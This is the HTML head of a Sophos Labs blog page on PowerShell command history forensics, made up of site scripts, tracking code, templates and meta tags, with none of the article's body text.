<!DOCTYPE html>
<html lang="en" class="direction-ltr" style="direction:ltr;" prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#"><head><link rel="stylesheet" href="https://community.sophos.com/cfs-filesystemfile/__key/system/h-00000000c5a78d6c-https-communitysophoscom-443-css/platform.less?_=637412226891796862" type="text/css" media="screen" /><script type ="text/javascript" src="/utility/jquery/jquery.min.js?_=637219788480000000"></script><script src="/utility/jquery/jquery.migrate.js?_=637219788480000000"></script><script type ="text/javascript" src="/utility/jquery/telligent.glow.min.js?_=637219788480000000"></script><script type="text/javascript" src="/utility/jquery/jquery.validate.min.js?_=637219788480000000"></script><script type="text/javascript">
// <![CDATA[
try { jQuery.extend(jQuery.validator.messages,{required:'This field is required.',remote:'Please fix this field.',date:'Please enter a valid date.',dateISO:'Please enter a valid date (ISO).',number:'Please enter a valid number.',digits:'Please enter only digits.',creditcard:'Please enter a valid credit card number.',equalTo:'Please enter the same value again.',accept:'Please enter a value with a valid extension.',maxlength:jQuery.validator.format('Please enter no more than {0} characters.'),minlength:jQuery.validator.format('Please enter at least {0} characters.'),rangelength:jQuery.validator.format('Please enter a value between {0} and {1} characters long.'),range:jQuery.validator.format('Please enter a value between {0} and {1}.'),max:jQuery.validator.format('Please enter a value less than or equal to {0}.'),min:jQuery.validator.format('Please enter a value greater than or equal to {0}.')}); } catch(e) { };
// ]]>
</script><script type="text/javascript" src="/utility/jquery/telligent.evolution.min.js?_=637219788480000000"></script><script type="text/javascript">
// <![CDATA[
try { jQuery.telligent.evolution.site.configure({baseUrl:'/',isRemote:false,enableGlobalForm:true,scheduledFileStatusUrl:'https://community.sophos.com/callback.ashx?__type=Telligent.Evolution.ScriptedContentFragments.Implementations.ScheduledFileSupportPlugin%2C%20Telligent.Evolution.Platform',remoteUrlEncodePattern:'',contextQueryString:'_pcurl=~%2Fsophos-labs%2Fb%2Fblog%2Fposts%2Fpowershell-command-history-forensics',editorConfigVersionKey:'AAAAAM36vC4%3DAAAAAM5TySg%3D',maxMediaWidth:0,mediaMaxHeight:0,defaultMediaWidth:640,defaultMediaHeight:480,directUploadContext:'76e9c4c8-1137-40fa-9fd9-0a818f0876d1',directUploadUrl:'https://community.sophos.com/multipleupload?UploadContext=76e9c4c8-1137-40fa-9fd9-0a818f0876d1',datePattern:{
	pattern: '<1-31> <Jan,Feb,Mar,Apr,May,Jun,Jul,Aug,Sep,Oct,Nov,Dec> <0001-9999>',
    yearIndex: 2,
    monthIndex: 1,
    dayIndex: 0,
    hourIndex: -1,
    minuteIndex: -1,
    amPmIndex: -1,
    parseDateOnLoad: true
},timePattern:{
	pattern: '<1-12>:<00-59> <AM,PM>',
    yearIndex: -1,
    monthIndex: -1,
    dayIndex: -1,
    hourIndex: 0,
    minuteIndex: 1,
    amPmIndex: 2,
    parseDateOnLoad: true
},dateTimePattern:{
	pattern: '<1-31> <Jan,Feb,Mar,Apr,May,Jun,Jul,Aug,Sep,Oct,Nov,Dec> <0001-9999> <1-12>:<00-59> <AM,PM>',
    yearIndex: 2,
    monthIndex: 1,
    dayIndex: 0,
    hourIndex: 3,
    minuteIndex: 4,
    amPmIndex: 5,
    parseDateOnLoad: true
},monthNames:['Jan','Feb','Mar','Apr','May','Jun','Jul','Aug','Sep','Oct','Nov','Dec'],dayNames:['Sun','Mon','Tue','Wed','Thu','Fri','Sat'],authorizationCookieName:'AuthorizationCookie',silverlightFileUploadEnabled:true,accessingUserId:2101,accessingUserIsSystemAccount:true,accessingUserTemporary:false,versionKey:'637219796360000000',directionality:'ltr',editorLanguage:'en-US',autoLinkPattern:/((?:http|ftp|https):\/\/)([\w\-]{1,63}(?:\.[\w\-]{1,63}){0,127}(?:\([\w\-\.,@?!^=%&:/~\+#]{0,2046}\)|[\w\-\.,@?!^=%&:/~\+#]{0,2047}[\w\-@?^=%&:/~\+#]){0,2048})/i,defaultErrorMessage:'An error occurred.  Please try again or contact your administrator.',quoteText:'Quote',dateMinuteInFutureFormat:'in a few seconds',dateMinutesInFutureFormat:'in {0} minutes',dateHourInFutureFormat:'in over an hour',dateHoursInFutureFormat:'in {0} hours',dateDayInFutureFormat:'in {0} day',dateDaysInFutureFormat:'in {0} days',dateMonthInFutureFormat:'in {0} month',dateMonthsInFutureFormat:'in {0} months',dateYearInFutureFormat:'in over {0} year',dateYearsInFutureFormat:'in over {0} years',dateNowAgoFormat:'now',dateMinuteAgoFormat:'a few seconds ago',dateMinutesAgoFormat:'{0} minutes ago',dateHourAgoFormat:'{0} hour ago',dateHoursAgoFormat:'{0} hours ago',dateDayAgoFormat:'{0} day ago',dateDaysAgoFormat:'{0} days ago',dateMonthAgoFormat:'{0} month ago',dateMonthsAgoFormat:'{0} months ago',dateYearAgoFormat:'over {0} year ago',dateYearsAgoFormat:'over {0} years ago',previewZoomIn:'Zoom in',previewZoomOut:'Zoom out',previewClose:'Close',beforeUnloadMessageTip:'Progress will cancel if you leave.',pendingTip:'Progress will begin soon…',beforeUnloadMessageLabel:'Please wait…'});
jQuery.extend($.fn.evolutionUserFileTextBox.defaults,{removeText:'Remove',selectText:'Select/Upload...',noFileText:'No File Selected'});
jQuery.telligent.evolution.navigationConfirmation.configure({message:'Unless you save before leaving this page, you will lose any changes you have made.'});
jQuery.telligent.evolution.validation.registerExtensions({passwordInvalidMessage:'Password contains invalid chars ...',passwordRegex:'^.*$',emailInvalidMessage:'Your email address is invalid.',emailRegex:'^[!$\u0026*\\-=^`|~#%\u0027\\.\"+\\/?_{}\\\\a-zA-Z0-9 ]+@[\\-\\.a-zA-Z0-9]+(?:\\.[a-zA-Z0-9]+)+$',usernameInvalidMessage:'Your sign in name does not meet the requirements for this site.',usernameRegex:'^[^\u003c\u003e=()\\/\\\\!%=.]+$',emailsInvalidMessage:'One or more emails is invalid',urlInvalidMessage:'URL not in correct format',urlRegex:'^(?:(?:http|https|mailto|ftp|mms):|/|#|~/|data:image/(?:png|gif|jpe?g);base64,)'});
jQuery.extend(jQuery.fn.evolutionLike.defaults,{likeText:'Like',unlikeText:'Unlike',modalTitleText:'People who like this',modalShowMoreText:'Show More',whoLikesOtherText:'\u003ca href=\"{user_profile_url}\" class=\"internal-link view-user-profile\"\u003e{user_display_name}\u003c/a\u003e likes this',whoLikesOtherTwoText:'\u003ca href=\"{user_profile_url}\" class=\"internal-link view-user-profile\"\u003e{user_display_name}\u003c/a\u003e and \u003cspan class=\"who-likes\"\u003e1 other\u003c/span\u003e like this',whoLikesOtherMultipleText:'\u003ca href=\"{user_profile_url}\" class=\"internal-link view-user-profile\"\u003e{user_display_name}\u003c/a\u003e and \u003cspan class=\"who-likes\"\u003e{count} others\u003c/span\u003e like this',whoLikesAccessingText:'You like this',whoLikesAccessingTwoText:'You and \u003cspan class=\"who-likes\"\u003e1 other\u003c/span\u003e like this',whoLikesAccessingMultipleText:'You and \u003cspan class=\"who-likes\"\u003e{count} others\u003c/span\u003e like this'});
jQuery.extend(jQuery.fn.evolutionInlineTagEditor.defaults,{editButtonText:'Edit tags',selectTagsText:'Select tags',saveTagsText:'Save',cancelText:'Cancel'});
jQuery.extend(jQuery.fn.evolutionStarRating.defaults,{titles:['Terrible','Poor','Fair','Average','Good','Excellent'],ratingMessageFormat:'Average rating: {rating} out of {max_rating} with {count} ratings.'});
jQuery.extend(jQuery.fn.evolutionModerate.defaults,{moderateLinkText:'moderate',reportLinkText:'Report as abusive',reportedLinkText:'Reported as abusive',reportedNotificationMessageText:'{NAME}\u0027s post has been reported. \u003cstrong\u003eThank you for your feedback.\u003c/strong\u003e'});
jQuery.extend(jQuery.fn.evolutionBookmark.defaults,{deleteBookmarkText:'Unbookmark {content_type_name}',addBookmarkText:'Bookmark this {content_type_name}',processingText:'...'});
jQuery.extend($.fn.evolutionCodeEditor.defaults,{editorUrl:'/cfs-file/__key/system/ace/ace.js'});
jQuery.extend(jQuery.telligent.evolution.ui.components.forumvotes.defaults,{modalTitleTextThread:'People who had this question',modalTitleTextReply:'People helped by this answer',noVotesText:'No Votes',modalShowMoreText:'More'});
jQuery.extend(jQuery.telligent.evolution.ui.components.forumqualityvotes.defaults,{modalTitleText:'People who voted on this thread',tipTextThread:'View Voters',noVotesText:'No Votes',upVoteText:'Vote Up',downVoteText:'Vote Down',logintext:'Login to vote on this thread',modalShowMoreText:'More'});
jQuery.extend(jQuery.fn.evolutionFeature.defaults,{editFeatureText:'Edit Feature',addFeatureText:'Feature ',processingText:'...'});
jQuery.telligent.evolution.systemNotifications.configure({explicitPanelUrl:'#_cptype=panel\u0026_cpcontexttype=Explicit\u0026_cppanelid=994a7020-02f3-4fc2-ba7d-be3f0febf9f9\u0026viewnotification=1',notificationText:'System Notification',reviewText:'Click to review and resolve.',andMoreText:' (plus {0} more)'});
} catch(e) { };
// ]]>
</script><script type="text/javascript">jQuery(function($) {
	$.telligent.evolution.messaging.subscribe('userActionFollowToggle', function(data) {
		var e = $(data.target);
		var userId = e.data('userid'), accessingUserId = e.data('accessinguserid'), v = e.data('follow');
		e.html('...');
		if (v) {
			$.telligent.evolution.post({
				url: $.telligent.evolution.site.getBaseUrl() + 'api.ashx/v2/users/{FollowerId}/following.json',
				data: { FollowerId: accessingUserId, FollowingId: userId },
				dataType: 'json',
				success: function(response) { e.html('Unfollow').data('follow', false); },
				error: function(response) {  e.html('Follow').data('follow', true); }
			});
		} else {
			$.telligent.evolution.del({
				url: $.telligent.evolution.site.getBaseUrl() + 'api.ashx/v2/users/{FollowerId}/following/{FollowingId}.json',
				data: { FollowerId: accessingUserId, FollowingId: userId },
				dataType: 'json',
				success: function(response) { e.html('Follow').data('follow', true); },
				error: function(response) {  e.html('Unfollow').data('follow', false); }
			});
		}
	});
});</script><script type="text/javascript">jQuery(function($) {
	$.telligent.evolution.messaging.subscribe('userActionFriendshipToggle', function(data) {
		var e = $(data.target);
		var userId = e.data('userid'), accessingUserId = e.data('accessinguserid'), v = parseInt(e.data('friendship'));
		var t = e.html();
		e.html('...');
		if (v == 0) {
				e.html(t);
				$.glowModal('/user/requestfriend?UserId=' + userId + '', {width:670,height:390});
		} else if (v == 3) {
				$.telligent.evolution.post({
					url: $.telligent.evolution.site.getBaseUrl() + 'api.ashx/v2/users/{RequestorId}/friends.json',
					data: { RequestorId: accessingUserId, RequesteeId: userId, RequestMessage: ' '},
					dataType: 'json',
					success: function(response) { window.location = window.location; },
					error: function(response) {  e.html(t); }
				});
		} else if (v == 1 || v == 2 || v == 4) {
			if (v == 4 || (v == 1 && window.confirm('Are you sure you want to cancel this friendship request?')) || (v == 2 && window.confirm('Are you sure you want to unfriend this person?'))) {
				$.telligent.evolution.del({
					url: $.telligent.evolution.site.getBaseUrl() + 'api.ashx/v2/users/{RequestorId}/friends/{RequesteeId}.json',
					data: { RequestorId: accessingUserId, RequesteeId: userId },
					dataType: 'json',
					success: function(response) { window.location = window.location; },
					error: function(response) {  e.html(t); }
				});
			} else { e.html(t); }
		}
	});
});</script><script type="text/javascript">
(function($){
$.extend($.fn.evolutionUpDownVoting.defaults,{voteDownMessage:'Vote against this idea',voteUpMessage:'Vote for this idea',loginMessage:'Sign in to vote on ideas',noPermissionMessage:'You do not have permission to vote for this idea',notGroupMemberMessage:'Join this group to vote on this idea',deleteMessage:'Remove your vote for this idea',readOnlyMessage: 'Voting on this idea has been disabled',switchToDownVoteMessage: 'Vote against this idea instead of for it',switchToUpVoteMessage: 'Vote for this idea instead of against it',voteDownAgainMessage:'Vote against this idea again',voteUpAgainMessage:'Vote for this idea again',removeDownVoteMesage:'Remove a vote against this idea',removeUpVoteMessage:'Remove a vote for this idea' });}(jQuery));
</script>
<script type="text/javascript">(function($){ $.telligent.evolution.media.defaults.endpoint = 'https://community.sophos.com/callback.ashx?__type=Telligent.Evolution.Api.Plugins.Endpoints.FileViewerEndpoint%2C%20Telligent.Evolution.Platform'; }(jQuery));</script><script type="text/javascript">(function($){ $.telligent.evolution.preview.defaults.endpoint = 'https://community.sophos.com/callback.ashx?__type=Telligent.Evolution.Api.Plugins.Endpoints.WebPreviewEndpoint%2C%20Telligent.Evolution.Platform'; }(jQuery));</script><script type="text/javascript">(function($){ $.fn.evolutionComposer.plugins.mentions.defaults.mentionablesEndpoint = 'https://community.sophos.com/callback.ashx?__type=Telligent.Evolution.Api.Plugins.Endpoints.MentionablesEndpoint%2C%20Telligent.Evolution.Platform'; }(jQuery));</script><script type="text/javascript">(function($){ $.telligent.evolution.language.defaults.dateEndpoint = 'https://community.sophos.com/callback.ashx?__type=Telligent.Evolution.Api.Plugins.Endpoints.DateFormattingEndpoint%2C%20Telligent.Evolution.Platform'; }(jQuery));</script><script type="text/javascript">(function($){ $.fn.evolutionUserFileTextBox.defaults.endpoint = 'https://community.sophos.com/callback.ashx?__type=Telligent.Evolution.Api.Plugins.Endpoints.UserFileTextBoxEndpoint%2C%20Telligent.Evolution.Platform'; }(jQuery));</script><style>
.contextual-administration-handle::after {
	width: 80%;
	height: 80%;
	top: 10%;
	left: 10%;
	background-image: url('https://community.sophos.com/cfs-filesystemfile/__key/defaultwidgets/fd266454714b4b3c9b7194d8b1bf9741-63df45f4dd4647c7821531bc63994672/edit.svg?_=637355151291907649');
}
#_tc_ap.contextual-administration-panel-container .contextual-administration-panel-wrapper .contextual-panel .contextual-panel-heading .navigation-list .search a {
	background-image: url('https://community.sophos.com/cfs-filesystemfile/__key/defaultwidgets/fd266454714b4b3c9b7194d8b1bf9741-63df45f4dd4647c7821531bc63994672/glass.svg?_=637355151291956606');
	background-repeat: no-repeat;
}
#_tc_ap.contextual-administration-panel-container .contextual-administration-panel-wrapper .contextual-panel .contextual-panel-heading .navigation-list .close a {
	background-image: url('https://community.sophos.com/cfs-filesystemfile/__key/defaultwidgets/fd266454714b4b3c9b7194d8b1bf9741-63df45f4dd4647c7821531bc63994672/cross.svg?_=637355151291849035');
	background-repeat: no-repeat;
}
}
#_tc_ap.contextual-administration-panel-container .contextual-administration-panel-wrapper .contextual-panel .contextual-panel-heading-search a.exit-search {
	background-image: url('https://community.sophos.com/cfs-filesystemfile/__key/defaultwidgets/fd266454714b4b3c9b7194d8b1bf9741-63df45f4dd4647c7821531bc63994672/cross.svg?_=637355151291849035');
	background-repeat: no-repeat;
}
#_tc_ap.contextual-administration-panel-container .contextual-administration-panel-wrapper .contextual-panel .contextual-panel-heading .navigation-list .back a .icon {
	background-image: url('https://community.sophos.com/cfs-filesystemfile/__key/defaultwidgets/fd266454714b4b3c9b7194d8b1bf9741-63df45f4dd4647c7821531bc63994672/back.svg?_=637355151291644040');
	background-repeat: no-repeat;
}
</style>



<script type="text/html" id="fragment-63df45f4dd4647c7821531bc63994672250869338_categoriesTemplate">
			</script>

<script type="text/html" id="fragment-63df45f4dd4647c7821531bc63994672250869338_panelContainerTemplate">
	<div id="_tc_ap" class="contextual-administration-panel-container">
	</div>
</script>

<script type="text/html" id="fragment-63df45f4dd4647c7821531bc63994672250869338_panelLoadingIndicatorTemplate">
	<div class="contextual-administration-panel-loading">
		<div class="spinner">
			<div class="bounce1"></div>
			<div class="bounce2"></div>
			<div class="bounce3"></div>
		</div>
	</div>
</script>

<script type="text/html" id="fragment-63df45f4dd4647c7821531bc63994672250869338_panelTemplate">
	<div class="contextual-administration-panel-wrapper" data-panelid="<%= panelId %>" data-namespace="<%: namespace %>">
		<div class="contextual-panel <%= type %> <%= cssClass %>">
			<div class="contextual-panel-heading">
				<ul class="navigation-list">
					<% if(backUrl && backLabel) { %>
						<li class="navigation-list-item <%= (backUrl == '#_cptype=root' ? type : type) %> back">
							<a href="<%: backUrl %>" class="ui-tip" data-tip="Back">
								<span class="icon">&lt;</span> <span class="label ui-squeezetext" data-minsize="11"><%= backLabel %></span>
							</a>
						</li>
					<% } else if (backLabel) { %>
						<li class="navigation-list-item <%= (backUrl == '#_cptype=root' ? type : type) %> back">
							<a href="#" class="ui-tip" data-tip="Back" onclick="window.history.back(); return false;">
								<span class="icon">&lt;</span> <span class="label ui-squeezetext" data-minsize="11"><%= backLabel %></span>
							</a>
						</li>
					<% } %>
					<li class="navigation-list-item search"><a href="#" class="ui-tip" data-tip="Search">Search</a></li>
					<li class="navigation-list-item close"><a href="#" data-messagename="contextual.shell.close" class="ui-tip" data-tip="Close">&times;</a></li>
				</ul>
				<h3 class="name ui-squeezetext ui-tip" data-minsize="11"><%= (name || '') %></h3>
				<div class="custom-panel-heading-content"></div>
				<div class="contextual-panel-heading-search">
					<form>
					<input type="text" placeholder="Search" />
					<a href="#" class="exit-search ui-tip" data-tip="Close Search">&times;</a>
					</form>
				</div>
			</div>
			<div class="contextual-panel-content glow-scrollable <%= contentClass %>">
				<%= (typeof content === "string" ? content : "") %>
			</div>
			<div class="contextual-panel-content-search-results glow-scrollable">
			</div>
		</div>
	</div>
</script>

<script type="text/html" id="fragment-63df45f4dd4647c7821531bc63994672250869338_customPanelTemplate">
	<div class="contextual-administration-panel-wrapper" data-panelid="<%= panelId %>" data-namespace="<%: namespace %>" data-rootpanelid="<%= (rootPanelId || '') %>">
		<div class="contextual-panel <%= cssClass %>">
			<div class="contextual-panel-heading">
				<ul class="navigation-list">
					<% if(backUrl && backLabel) { %>
						<li class="navigation-list-item back">
							<a href="<%: backUrl %>" class="ui-tip" data-tip="Back">
								<span class="icon">&lt;</span> <span class="label ui-squeezetext" data-minsize="11"><%= backLabel %></span>
							</a>
						</li>
					<% } %>
					<li class="navigation-list-item close"><a href="#" data-messagename="contextual.shell.close" class="ui-tip" data-tip="Close">&times;</a></li>
				</ul>
				<h3 class="name ui-squeezetext ui-tip" data-minsize="11"><%= (name || '') %></h3>
				<div class="custom-panel-heading-content"></div>
			</div>
			<div class="contextual-panel-content <%= contentClass %>">
				<%= (typeof content === "string" ? content : "") %>
			</div>
		</div>
	</div>
</script>

<script type="text/html" id="fragment-63df45f4dd4647c7821531bc63994672250869338_loadingIndicatorTemplate">
	<div class="scrollable-loading-indicator"><span class="ui-loading"></span></div>
</script>



<script type="text/javascript" src="https://community.sophos.com/cfs-filesystemfile/__key/defaultwidgets/fd266454714b4b3c9b7194d8b1bf9741-63df45f4dd4647c7821531bc63994672/ui.js?_=637355151292337313"></script>
<script type="text/javascript">
// only show contextual shell in top-most window
if (window === window.top) {
	jQuery(function(j){
		jQuery.telligent.evolution.widgets.contextualPanelShell.register({
			rootCategoriesTemplateId: 'fragment-63df45f4dd4647c7821531bc63994672250869338_categoriesTemplate',
			panelContainerTemplateId: 'fragment-63df45f4dd4647c7821531bc63994672250869338_panelContainerTemplate',
			panelTemplateId: 'fragment-63df45f4dd4647c7821531bc63994672250869338_panelTemplate',
			loadingIndicatorTemplateId: 'fragment-63df45f4dd4647c7821531bc63994672250869338_loadingIndicatorTemplate',
			panelLoadingIndicatorTemplateId: 'fragment-63df45f4dd4647c7821531bc63994672250869338_panelLoadingIndicatorTemplate',
			loadUrl: '/utility/scripted-file.ashx?_cf=load.vm\u0026_fid=63df45f4dd4647c7821531bc63994672\u0026_wid=fragment-63df45f4dd4647c7821531bc63994672250869338\u0026_ct=plugin\u0026_cp=\u0026_ctt=a3b17ab0af5f11dda3501fcf55d89593\u0026_ctc=d464a5a0b4b946b7b085e3eade1355a0\u0026_ctn=3fc3f82483d14ec485ef92e206116d49\u0026_cc=0\u0026_ipd=0\u0026_pt=Telligent.Evolution.CoreServices.Administration.Plugins.ContextualPanelServicePlugin%2C%20Telligent.Evolution.Platform\u0026_pcurl=~%2Fsophos-labs%2Fb%2Fblog%2Fposts%2Fpowershell-command-history-forensics',
			searchUrl: '/utility/scripted-file.ashx?_cf=search.vm\u0026_fid=63df45f4dd4647c7821531bc63994672\u0026_wid=fragment-63df45f4dd4647c7821531bc63994672250869338\u0026_ct=plugin\u0026_cp=\u0026_ctt=a3b17ab0af5f11dda3501fcf55d89593\u0026_ctc=d464a5a0b4b946b7b085e3eade1355a0\u0026_ctn=3fc3f82483d14ec485ef92e206116d49\u0026_cc=0\u0026_ipd=0\u0026_pt=Telligent.Evolution.CoreServices.Administration.Plugins.ContextualPanelServicePlugin%2C%20Telligent.Evolution.Platform\u0026_pcurl=~%2Fsophos-labs%2Fb%2Fblog%2Fposts%2Fpowershell-command-history-forensics',
			rootPanelUrl: '#_cptype=root',
			previewPanelUrl: '#_cptype=panel\u0026_cpcontexttype=Theme\u0026_cppanelid=a81369a5-aa60-4034-8a25-07df22cd9c42',
			customPanelTemplateId: 'fragment-63df45f4dd4647c7821531bc63994672250869338_customPanelTemplate',
			hasCategories:  false ,
			supportsExplicitOnly:  false ,
			manageCommunityText: '\tManage Sophos Community'
		});
	});
}
</script>
	<title>PowerShell Command History Forensics - Blog - Sophos Labs - Sophos Community</title>
<link rel="canonical" href="https://community.sophos.com/sophos-labs/b/blog/posts/powershell-command-history-forensics" /><meta key="og:site_name" content="Sophos Community" />
<meta name="GENERATOR" content="Telligent Community 11" />
<meta name="keywords" content="clear-history, ConsoleHost_history.txt, psreadline, get-history, console, History, command, PowerShell" />
<meta name="description" content=" 
 
 
 Contents: 
 - Overview 
 
 Powershell and Windows Events 
 Get-History 
 Console History File 
 
 - Adversarial Tactics 
 
 Clear-History 
 Backup/Restore..." />
<meta property="og:type" content="article" />
<meta property="og:image" content="https://community.sophos.com/cfs-file/__key/communityserver-blogs-components-weblogfiles/00-00-00-00-28/Community-Blue-800x400.png" />
<meta property="og:url" content="https://community.sophos.com/sophos-labs/b/blog/posts/powershell-command-history-forensics" />
<meta property="og:description" content=" 
 
 
 Contents: 
 - Overview 
 
 Powershell and Windows Events 
 Get-History 
 Console History File 
 
 - Adversarial Tactics 
 
 Clear-History 
 Backup/Restore..." />
<meta property="og:title" content="PowerShell Command History Forensics" /><link type="text/css" rel="stylesheet" href="https://community.sophos.com/cfs-filesystemfile/__key/uifiles/h-00000000c5a78d6b-3fc3f82483d14ec485ef92e206116d49-s-00000000000000000000000000000000-0-stylesheetfiles-637384878543600000-https-communitysophoscom-443/screen.less?_=637412226599979549" /><link type="text/css" rel="stylesheet" href="https://community.sophos.com/cfs-filesystemfile/__key/uifiles/h-00000000c5a78d6b-3fc3f82483d14ec485ef92e206116d49-s-00000000000000000000000000000000-0-stylesheetfiles-637384878543600000-https-communitysophoscom-443/print.css?_=637412226631034376" media="print" /><link type="text/css" rel="stylesheet" href="https://community.sophos.com/cfs-filesystemfile/__key/uifiles/h-00000000c5a78d6b-3fc3f82483d14ec485ef92e206116d49-s-00000000000000000000000000000000-0-stylesheetfiles-637384878543600000-https-communitysophoscom-443/handheld.less?_=637412226630702300" media="only screen and (max-width: 670px)" /><link type="text/css" rel="stylesheet" href="https://community.sophos.com/cfs-filesystemfile/__key/uifiles/h-00000000c5a78d6b-3fc3f82483d14ec485ef92e206116d49-s-00000000000000000000000000000000-0-stylesheetfiles-637384878543600000-https-communitysophoscom-443/tablet.less?_=637412226640497318" media="only screen and (min-device-width: 671px) and (max-device-width: 1024px) and (orientation: landscape), only screen and (min-device-width: 671px) and (max-device-width: 1024px) and (orientation: portrait)" /><meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1, maximum-scale=1" />

	<link rel="icon" type="image/png" href="https://community.sophos.com/cfs-file/__key/themefiles/tc-s-3fc3f82483d14ec485ef92e206116d49-00000000000000000000000000000000-favicon/favicon.ico">
	<link rel="apple-touch-icon" href="https://community.sophos.com/cfs-file/__key/themefiles/tc-s-3fc3f82483d14ec485ef92e206116d49-00000000000000000000000000000000-favicon/favicon.ico">
<link type="text/css" rel="stylesheet" href="https://community.sophos.com/cfs-filesystemfile/__key/uifiles/h-00000000c5a78d6b-3fc3f82483d14ec485ef92e206116d49-s-00000000000000000000000000000000-0-stylesheetfiles-637384878543600000-https-communitysophoscom-443/sophos.less?_=637412226641864437" />
<script type="text/javascript" src="https://community.sophos.com/cfs-filesystemfile/__key/themefiles/f-s-3fc3f82483d14ec485ef92e206116d49-jsfiles/theme.js?_=637384878547581651"></script>
<script type="text/javascript">
jQuery(function(j){
	j.telligent.evolution.theme.social.register({
		dockedSidebars:  true ,
		adaptiveHeaders:  true ,
		adaptiveHeadersMinWidth: 670
	})
});
</script>
<link rel="stylesheet" href="https://static.cloud.coveo.com/searchui/v1.2537/css/CoveoFullSearchNewDesign.css" /><!-- Start Marketing GA Tracking -->
<script type="text/javascript">
/*
 * jQuery Cookie Plugin v1.4.0
 * https://github.com/carhartl/jquery-cookie
 *
 * Copyright 2013 Klaus Hartl
 * Released under the MIT license
 */
(function(a){if(typeof define==="function"&&define.amd){define(["jquery"],a)}else{a(jQuery)}}(function(a){var f=/\+/g;function d(i){return b.raw?i:encodeURIComponent(i)}function c(i){return b.raw?i:decodeURIComponent(i)}function h(i){return d(b.json?JSON.stringify(i):String(i))}function e(j){if(j.indexOf('"')===0){j=j.slice(1,-1).replace(/\\"/g,'"').replace(/\\\\/g,"\\")}try{j=decodeURIComponent(j.replace(f," "))}catch(i){return}try{return b.json?JSON.parse(j):j}catch(i){}}function g(j,i){var k=b.raw?j:e(j);return a.isFunction(i)?i(k):k}var b=a.cookie=function(o,w,r){if(w!==undefined&&!a.isFunction(w)){r=a.extend({},b.defaults,r);if(typeof r.expires==="number"){var m=r.expires,v=r.expires=new Date();v.setDate(v.getDate()+m)}return(document.cookie=[d(o),"=",h(w),r.expires?"; expires="+r.expires.toUTCString():"",r.path?"; path="+r.path:"",r.domain?"; domain="+r.domain:"",r.secure?"; secure":""].join(""))}var u=o?undefined:{};var k=document.cookie?document.cookie.split("; "):[];for(var n=0,p=k.length;n<p;n++){var s=k[n].split("=");var q=c(s.shift());var j=s.join("=");if(o&&o===q){u=g(j,w);break}if(!o&&(j=g(j))!==undefined){u[q]=j}}return u};b.defaults={};a.removeCookie=function(i,j){if(a.cookie(i)!==undefined){a.cookie(i,"",a.extend({},j,{expires:-1}));return true}return false}}));eval(function(h,b,d,g,f,i){f=function(a){return a.toString(b)};if(!"".replace(/^/,String)){while(d--){i[f(d)]=g[d]||f(d)}g=[function(a){return i[a]}];f=function(){return"\\w+"};d=1}while(d--){if(g[d]){h=h.replace(new RegExp("\\b"+f(d)+"\\b","g"),g[d])}}return h}('2 4(a){a=a.3(/[\\[]/,"\\\\\\[").3(/[\\]]/,"\\\\\\]");0 b="[\\\\?&]"+a+"=([^&#]*)";0 c=o h(b);0 d=c.m(l.n.i);6(d==5){8""}j{8 k(d[1].3(/\\+/g," "))}}2 e(){0 a=4(\'9\');6($.7(\'f\')==5){0 a=4(\'9\');6(a!=""){$.7(\'f\',a,{p:5,q:\'/\',r:\'.s.t\'})}}}$(u).v(2(){e()});',32,32,"var||function|replace|getParameterByName|null|if|cookie|return|id|||||readReferralAndWriteToCookie|SOPHOS_PARTNERID||RegExp|href|else|decodeURIComponent|window|exec|location|new|expires|path|domain|sophos|com|document|ready".split("|"),0,{}));function setDefaultCampaignId(){$.cookie("CampaignID","0",{expires:180,path:"/",domain:".sophos.com"})}function readCampaignAndWriteToCookie(){var b=getParameterByName("cmp");if(b!=""){var c=new RegExp(/^[a-zA-Z0-9]+$/);var d=c.exec(b);if(d!=null&&d!="0"){$.cookie("CampaignID",b,{expires:180,path:"/",domain:".sophos.com"})}else{if($.cookie("CampaignID")==null){setDefaultCampaignId()}}}else{if($.cookie("CampaignID")==null){setDefaultCampaignId()}}}
</script>



<script type="text/javascript">

if (typeof readCampaignAndWriteToCookie== 'function') { 
  readCampaignAndWriteToCookie(); 
}

function GetCookie(k){return(document.cookie.match('(^|; )'+k+'=([^;]*)')||0)[2]}
var campaignId = GetCookie('CampaignID');

var _gaq = _gaq || []; 
_gaq.push(
['_setAccount', 'UA-737537-1'],
['_setDomainName', '.sophos.com'],
['_setAllowLinker', true],
['_setAllowHash', false],
['_setCustomVar', 4, 'CampaignID', campaignId, 3],
['_trackPageview', '/community'+window.location.pathname+window.location.search],
['o._setAccount', 'UA-737537-18'],
['o._setDomainName', '.sophos.com'],
['o._setAllowLinker', true],
['o._setAllowHash', false],
['o._setCustomVar', 4, 'CampaignID', campaignId, 3],
['o._trackPageview', '/community'+window.location.pathname+window.location.search]
);


(function() {
var ga = document.createElement('script');
ga.type = 'text/javascript'; ga.async = true;
ga.src = ('https:' == document.location.protocol ? 'https://' : 'http://') + 'stats.g.doubleclick.net/dc.js';
var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
})();
</script>



<script type="text/javascript" src="https://www.sophos.com/en-us/medialibrary/scripts/tracking/nonhtmltracking.js"></script>

<script src="https://www.sophos.com/en-us/medialibrary/Scripts/Tracking/gainjectmin.js?v=1" type="text/javascript"></script>
<script type="text/javascript">
/* Instantiate and execute */
$(function () {
    window.sophosGaGuidStore.processGaToken({
        useGoogleVid: true,
        gaScope: 1,
        gaNamespace: 'o',
        gaAccount: 'UA-737537-18'
    });
});
</script>

<!-- End Marketing GA Tracking -->

<script> 
var str = "Older GA code in place!"; 
console.log(str); 
</script>

<script>
(function(d,b,a,s,e){ var t = b.createElement(a),
    fs = b.getElementsByTagName(a)[0]; t.async=1; t.id=e; t.src=s;
    fs.parentNode.insertBefore(t, fs); })
(window,document,'script','https://scripts.demandbase.com/WuEFNglz.min.js','demandbase_js_lib');
</script>

<meta name="google-site-verification" content="e3ZHLAIh9-umNZW8SqnpquKMSBLVnc9mkLHO6yP659g" />

<link rel="stylesheet" href="https://community.sophos.com/cfs-filesystemfile/__key/uifiles/h-00000000c5a78d6b-3fc3f82483d14ec485ef92e206116d49-b-d464a5a0b4b946b7b085e3eade1355a0-0-header-1665-637571140156700000-https-communitysophoscom-443/style.less?_=637572461430967610"  />
